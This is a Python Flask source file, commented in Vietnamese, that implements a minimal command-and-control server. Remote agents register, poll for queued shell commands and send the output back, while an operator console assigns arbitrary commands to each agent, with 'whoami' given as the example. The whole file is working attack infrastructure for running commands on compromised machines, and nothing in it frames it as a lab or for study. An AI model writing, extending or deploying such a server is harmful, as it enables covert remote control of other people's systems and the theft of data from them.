from flask import Flask, request
import random
import string
import datetime
import threading
import time
import sys

# Tắt log mặc định của Flask để đỡ rối mắt khi chat
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Cấu trúc: {'ID': {'name': '...', 'tasks': ['lenh1', 'lenh2'], 'results': []}}
agents = {}

def generate_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

# --- API ENDPOINTS ---

@app.route('/reg', methods=['POST'])
def register():
    agent_name = request.form.get('name')
    new_id = generate_id()
    agents[new_id] = {
        "name": agent_name,
        "tasks": [],     # Hàng đợi lệnh
        "results": []
    }
    print(f"\n[+] New Agent: {agent_name} -> ID: {new_id}")
    return new_id, 200

@app.route('/tasks/<agent_id>', methods=['GET'])
def get_task(agent_id):
    # Nếu agent tồn tại và có lệnh đang chờ
    if agent_id in agents and agents[agent_id]['tasks']:
        # Lấy lệnh đầu tiên ra (First In First Out)
        task = agents[agent_id]['tasks'].pop(0)
        return task, 200
    return '', 204 # 204 No Content (Không có việc gì làm)

@app.route('/results/<agent_id>', methods=['POST'])
def receive_result(agent_id):
    if agent_id in agents:
        output = request.form.get('result')
        print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{output}")
        print("C2 > ", end="", flush=True)
    return '', 200

# --- CLI (Giao diện nhập lệnh) ---

def console_thread():
    time.sleep(2) # Đợi server start
    print("\n=== C2 COMMAND CENTER ===")
    print("Syntax: set <agent_id> <command>")
    print("Example: set A1B2C3 whoami")
    
    while True:
        try:
            cmd = input("\nC2 > ")
            if not cmd: continue
            
            parts = cmd.split(' ', 2)
            if parts[0] == "set" and len(parts) == 3:
                target_id = parts[1]
                task = parts[2]
                
                if target_id in agents:
                    agents[target_id]['tasks'].append(task)
                    print(f"[*] Queued task '{task}' for Agent {target_id}")
                else:
                    print(f"[-] Agent ID {target_id} not found!")
            elif cmd == "list":
                print(f"Agents: {list(agents.keys())}")
            else:
                print("Unknown command. Use: set <id> <cmd> | list")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    # Chạy luồng nhập liệu song song
    t = threading.Thread(target=console_thread, daemon=True)
    t.start()
    
    # Chạy server
    app.run(host='0.0.0.0', port=8080)